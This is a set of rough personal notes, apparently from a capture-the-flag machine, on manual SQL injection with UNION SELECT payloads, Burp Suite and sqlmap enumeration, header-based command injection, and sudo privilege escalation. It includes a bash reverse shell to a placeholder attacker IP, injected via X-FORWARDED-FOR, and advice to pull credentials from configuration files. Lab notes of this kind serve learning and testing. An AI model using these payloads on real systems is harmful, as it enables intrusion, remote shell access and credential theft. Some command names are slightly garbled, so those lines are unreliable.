# Notes
Based on doing SQL manually
* Union and information schema 

(Examine small things like the camelcase to lowercase)
When using SQL map find query that returns something such as player
With this using a single quote or a comment to see what it returns can yield different results.

When in burpsuite doing something like 
`player=ippsec' union select 1, 2 -- -` was not valid but the 1 was meaning only one column.
Just as doing this on a table you can do it in burpsuite

Looking at how the firewall.php interacts can tell you if you can get remote code execution with repeater on burpsuite
```bash
* X-FORWARDED-FOR: ;sleep 1; then 2 then 3 to test for any type of delay
  # Reverse shell
* X-FORWARDED-FOR: ;bash -c 'bash -i >& /dev/tcp/<Attacker IP>/<Netcat Port> 0>&1'
```

Lastly looking into what commands that are run in files helps understand what permissions are available to the user
### Types of Tools or commands
`nmap`
`nc -zv <IP> <Port>`
`shh`
`gobuster dir -w /opt/Seclists/Discovery -x php.out`
`burpsuite`
* Using the intercept on, copy request to file and name
`sql -r flag.req --dump`

Using Repeater alot


Also going back to the repeater, and mess with player=

Googling `sql information_schema schemata`

This will tell us what permissions of sudo the user has
`sudo -l`
`sudo su -`
# Methods
`nmap -sC -sV -oA nmap/union <IP>`
Ubuntu
Cookie:PHP
CamelCase to lowercase

When using sql injection, look for
* Something valid
* Something not valid 
* See results
* Then use comments or other methods to see if both yield the same or different results.


When doing SQL injection look into the configuration files to find types of creds for the system
